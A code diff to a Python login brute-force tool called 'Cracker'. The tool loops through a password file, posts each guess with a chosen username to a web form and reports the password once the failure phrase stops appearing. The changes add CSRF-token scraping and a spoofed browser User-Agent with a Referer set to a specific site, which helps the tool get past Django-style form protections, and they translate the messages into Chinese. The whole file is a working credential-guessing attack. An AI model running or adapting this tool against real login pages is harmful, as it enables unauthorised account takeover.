@@ -1,49 +1,52 @@
 import os
 import sys
-from time import sleep
+import json
 import requests
+from bs4 import BeautifulSoup
+
+header = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62',
+    'Referer': 'https://leiasama.pythonanywhere.com/'
+}
 
 
-class Cracker():
+class Cracker:
     def __init__(self, url, file, login, submit, params_names, fail_phrase):
         self.submit = submit
         self.url = url
         self.fail = fail_phrase
         self.file_name = file
         if os.path.exists(file):
-            # Read data from file
+            # 从文件中读取数据
             self.passes = self.read_data(self.file_name)
-            print("Data correctly loaded!")
+            print("数据加载成功！")
             print(self.passes)
 
             self.login = login
             if len(login) == 0:
-                print("Login not specified!")
+                print("未指定登录用户名！")
                 sys.exit()
 
-            # Prepare data to send
+            # 准备要发送的数据
             try:
                 self.data = []
                 for pas in self.passes:
                     self.data.append((params_names[0], self.login, params_names[1], pas, params_names[2], self.submit))
-                print("Data correctly prepared!")
+                print("数据准备成功！")
                 print(self.data)
-
-
             except IndexError:
-                print("Params names specified incorrectly")
+                print("参数名称指定不正确")
                 sys.exit()
 
-            # Send data to server
+            # 发送数据到服务器
             for index, single_data in enumerate(self.data):
-                print(f"[ {index + 1}/{len(self.passes)} ] Sending ", single_data, "for", self.url)
+                print(f"[ {index + 1}/{len(self.passes)} ] 正在发送数据 ", single_data, "到", self.url)
                 if self.send(self.url, single_data, self.fail):
-                    print("Password found!")
-                    print("Login:", self.login)
-                    print("Password:", single_data[3])
-
+                    print("密码已找到！")
+                    print("用户名:", self.login)
+                    print("密码:", single_data[3])
         else:
-            print("File could not be found!")
+            print("文件无法找到！")
             sys.exit()
 
     def read_data(self, filename):
@@ -52,8 +55,22 @@ class Cracker():
             return lines
 
     def send(self, url, data, fail):
-        ready_data = {data[0]: data[1], data[2]: data[3], data[4]: data[5]}
-        r = requests.post(url=url, data=ready_data)
+
+        response = requests.get(url=url, headers=header)
+
+        html = response.text
+
+        soup = BeautifulSoup(html, 'lxml')
+        csrf_token = soup.find('input').get('value')
+
+        ready_data = {data[0]: data[1], data[2]: data[3], data[4]: data[5], "csrfmiddlewaretoken": csrf_token,
+                      'next': '/'}
+        cookies = {
+            'csrftoken': csrf_token
+        }
+
+        r = requests.post(url=url, data=ready_data, headers=header, cookies=cookies)
+
         if fail in r.text:
             return False
         else:
@@ -70,4 +87,4 @@ try:
     cracker = Cracker(URL, PASS, LOGIN, BUTTON_VALUE, (PARAMS_NAMES[0], PARAMS_NAMES[1], PARAMS_NAMES[2]), FAIL)
 except IndexError:
     print(
-        "Usage: python script.py <url> <path_to_file_with_passes> <login> <submit_button_value> <post_of_login/username?password?submit_button, separeted with '?' <fail_phrase>")
+        "用法: python script.py <url> <包含密码的文件路径> <登录用户名> <提交按钮值> <登录/用户名?密码?提交按钮，用'?'分隔 <成功提示短语>")
